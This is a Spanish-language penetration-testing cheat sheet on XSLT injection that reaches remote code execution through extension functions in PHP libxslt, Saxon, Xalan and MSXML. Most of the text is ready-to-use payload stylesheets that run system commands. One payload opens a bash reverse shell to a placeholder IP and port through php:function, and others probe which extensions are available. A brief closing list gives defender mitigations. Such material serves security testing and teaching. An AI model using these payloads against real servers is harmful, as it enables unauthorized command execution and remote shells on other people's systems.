---
aliases:
  - XSLT RCE
  - XSLT Extension Functions
  - XSLT php:function
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
---
# XSLT - Extension Functions (RCE)

***

## Cheatsheet

| **Motor** | **Namespace / Vector** | **Requisito** |
|:---:|:---:|---|
| **PHP (libxslt)** | `php:function('system','id')` | Backend llama `$xsl->registerPHPFunctions()`. |
| **Saxon-PE/EE (Java)** | `xmlns:rt="java:java.lang.Runtime"` → `rt:getRuntime()` → `Runtime . exec` | Saxon Professional/Enterprise, `ALLOW_EXTERNAL_FUNCTIONS=true`. |
| **Xalan-Java** | `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` | Xalan default permite static Java calls. |
| **Microsoft MSXML** | `<msxsl:script language="JScript">` con `ActiveXObject("WScript.Shell")` | MSXML6 con scripts habilitados (off default post-2006). |
| **BaseX / eXist-DB** | `xmlns:proc="java:org.basex.query.func.ProcFn"` | XQuery embebido. |
| **Detect extensions** | `function-available('php:function')` / `function-available('saxon:evaluate')` | Retorna `true` / `false` — probar por motor. |
^xslt-extensions

___

## Overview

**Extension functions** = permiten a XSLT llamar código del lenguaje host (PHP, Java, JScript, C#). Si el backend habilita extensions y pasa XSL controlado por user → **RCE directo**.

### PHP (libxslt) — el más común

Backend vulnerable típico:
```php
$xsl = new XSLTProcessor();
$xsl->registerPHPFunctions();  // <-- KEY: habilita php:function
$xsl->importStyleSheet(DOMDocument::loadXML($user_xsl));
echo $xsl->transformToXML(new DOMDocument());
```

**Payload RCE:**
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
    <xsl:template match="/">
        <xsl:value-of select="php:function('system','id')"/>
    </xsl:template>
</xsl:stylesheet>
```

Funciones PHP alcanzables vía `php:function`:
- `system`, `passthru`, `shell_exec`
- `file_get_contents`, `file_put_contents`
- `base64_decode`, `gzinflate` (para decoding payloads)
- Cualquier función registrada específicamente con `registerPHPFunctions(['system'])` si hay whitelist.

Reverse shell:
```xml
<xsl:value-of select="php:function('system','bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;')"/>
```

### Saxon (Java) — reflection

Saxon-PE/EE soporta `java:` namespace para llamar cualquier clase Java. Idea general:
1. Importar `java.lang.Runtime` como namespace.
2. Invocar `getRuntime()` → obtener Runtime instance.
3. Llamar `Runtime . exec` con el comando.
4. Leer stdout del Process via `java.util.Scanner`.

Estructura:
```xml
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:Runtime="java:java.lang.Runtime"
    xmlns:Process="java:java.lang.Process"
    xmlns:Scanner="java:java.util.Scanner">
  <xsl:template match="/">
    <xsl:variable name="rt" select="Runtime:getRuntime()"/>
    <xsl:variable name="proc" select="Runtime:exec ($rt, 'id')"/>
    <xsl:variable name="is" select="Process:getInputStream($proc)"/>
    <xsl:variable name="sc" select="Scanner:new($is)"/>
    <xsl:value-of select="Scanner:useDelimiter($sc, '\A')"/>
    <xsl:value-of select="Scanner:next($sc)"/>
  </xsl:template>
</xsl:stylesheet>
```

### Xalan-Java — Runtime estático

Xalan-Java (Apache) incluye extensiones default que permiten llamadas a `java.lang.Runtime`. Namespace:
```xml
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
```

Invocación análoga: `rt:getRuntime()` → `rt:exec ($runtime, 'id')` → `ob:toString(...)`.

### MSXML (.NET) — embed JScript

MSXML6 permite scripts inline. Desactivado por default desde 2006, pero legacy apps lo habilitan:
```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:ext="urn:extension">
  <msxsl:script language="JScript" implements-prefix="ext">
    function runCmd(cmd) {
      var wsh = new ActiveXObject("WScript.Shell");
      return wsh.Run (cmd);
    }
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="ext:runCmd('calc.exe')"/>
  </xsl:template>
</xsl:stylesheet>
```

### Detección de extensions habilitadas

```xml
<xsl:if test="function-available('php:function')">
    <xsl:value-of select="'PHP-RCE-AVAILABLE'"/>
</xsl:if>
<xsl:if test="function-available('saxon:evaluate')">
    <xsl:value-of select="'SAXON-AVAILABLE'"/>
</xsl:if>
```

Por motor:
- `php:function` → libxslt PHP
- `java:java.lang.Runtime.getRuntime` → Saxon / Xalan
- `msxsl:script` → MSXML

### Mitigación defender

- PHP: NO llamar `registerPHPFunctions()` — o pasar whitelist estricta.
- Saxon: usar `Saxon-HE` (sin extensions), setear `FeatureKeys.ALLOW_EXTERNAL_FUNCTIONS = false`.
- Xalan: `TransformerFactory.setFeature("http://www.oracle.com/xml/jaxp/properties/enableExtensionFunctions", false)`.
- MSXML: `xslt.XmlResolver = null; xslt.EnableScript = false`.

***
